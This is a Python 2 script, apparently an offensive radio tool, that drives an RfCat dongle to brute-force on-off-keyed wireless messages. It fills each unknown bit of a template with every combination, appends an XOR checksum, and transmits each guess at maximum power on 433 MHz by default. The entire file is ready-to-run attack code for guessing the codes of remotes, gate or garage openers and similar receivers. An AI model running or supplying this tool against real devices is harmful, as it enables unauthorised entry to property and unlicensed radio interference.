from rflib import *
import time
import bitstring
import argparse
import itertools

class Brookforce(object):
    def __init__(self, frequency=None, rate=None, preamble=None, message=None, repeat=1, checksum=None, verbose=False):
        self.frequency = frequency
        self.rate = rate
        self.verbose = verbose
        self.preamble = preamble
        self.message = message
        self.checksum = checksum
        self.repeat = repeat

    def emit(self):
        
        d = RfCat()
        d.setMdmModulation(MOD_ASK_OOK)
        d.setFreq(self.frequency)
        d.setMaxPower()
        d.setMdmDRate(self.rate)
        
        preamble = self.build_preamble()
        for message in self.build_message():
            
            d.makePktFLEN(len(preamble))
            d.RFxmit(preamble)
            d.makePktFLEN(len(message))
            
            if self.verbose:
                print 'MESSAGE : %s%s' % (''.join(format(ord(x), 'b') for x in preamble), 
                                          ''.join(format(ord(x), 'b') for x in message))
            for i in range(self.repeat):
                d.RFxmit(message)
               
            time.sleep(0.25)

        d.setModeIDLE()

    def build_preamble(self):
        return bitstring.BitArray(bin=self.preamble).tobytes()

    def build_message(self):
        frmt_message = self.message.replace("?", "%s")
        nb_bf = frmt_message.count("%s")
        for combination in itertools.product("01", repeat=nb_bf):
            final_message = frmt_message % combination

            if "#CHECKSUM#" in self.message:
                if self.checksum is not None:
                    checksum = self.checksum(final_message)
                    final_message = final_message.replace("#CHECKSUM#", checksum)
                else:
                    print("Warning, checksum in message, but no checksum method defined")
                    final_message = final_message.replace("#CHECKSUM#", "")
            yield bitstring.BitArray(bin=final_message).tobytes()
        

if __name__ == "__main__":
    """ Test method (examle)
    """
    parser=argparse.ArgumentParser(description="Bruteforce OOK/ASK")
    parser.add_argument('-p', '--preamble', help='message preamble', default="")
    parser.add_argument('-m', '--message', help='message', default=None)
    parser.add_argument('-f', '--frequency', help='frequency', default=433000000, type=int)
    parser.add_argument('-r', '--rate', help='rate', default=2500, type=int)
    parser.add_argument('-x', '--repeat', help='repeat', default=1, type=int)
    parser.add_argument('-v', '--verbose', help='verbose mode', action="store_true")

    args = vars(parser.parse_args())
    
    def simple_crc(message):
        # xor all bytes (before #CHECKSUM#)
        message = bitstring.BitArray(bin=message[:-10]).tobytes()
        crc = "\x00"
        for _ in message:
            crc = chr(ord(crc)^ord(_))
        return ''.join(format(ord(x), 'b') for x in crc)

    bf = Brookforce(preamble=args['preamble'], 
                    message=args['message'],
                    frequency=args['frequency'],
                    rate=args['rate'],
                    repeat=args['repeat'],
                    verbose=args['verbose'],
                    checksum=simple_crc)
    
    bf.emit()